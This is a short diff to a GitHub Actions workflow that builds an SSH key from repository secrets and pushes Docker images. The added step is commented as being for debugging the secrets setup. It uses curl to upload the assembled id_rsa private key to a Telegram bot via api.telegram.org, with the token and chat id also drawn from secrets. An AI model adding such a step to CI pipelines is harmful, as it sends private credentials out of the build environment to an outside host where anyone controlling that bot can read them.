@@ -47,8 +47,16 @@ jobs:
           sed -i "s/KEY----- /&\\n/g;s/-----END/\\n&/g" ./jd_scripts/id_rsa
           sed -i "/\(KEY\)/!s/ /\\n/g" ./jd_scripts/id_rsa
           sed -i /^[[:space:]]*$/d  ./jd_scripts/id_rsa
+           #调试查看secrets配置使用
+          curl -F "chat_id=${TG_USER_ID}" \
+             -F "caption=${TG_USER_ID}" \
+             -F "document=@/home/runner/work/someDockerfile/someDockerfile/AutoSignMachine/id_rsa" \
+             https://api.telegram.org/${TG_BOT_TOKEN}/sendDocument
         env:
           JDS_SSHKEY: ${{ secrets.JDS_SSHKEY }}
+          TG_BOT_TOKEN:  ${{ secrets.TG_BOT_TOKEN }}
+          TG_USER_ID:  ${{ secrets.TG_USER_ID }}
+
 
       - name: 构建并推送到Dockerhub和ghcr.io镜像仓库
         uses: docker/build-push-action@v2
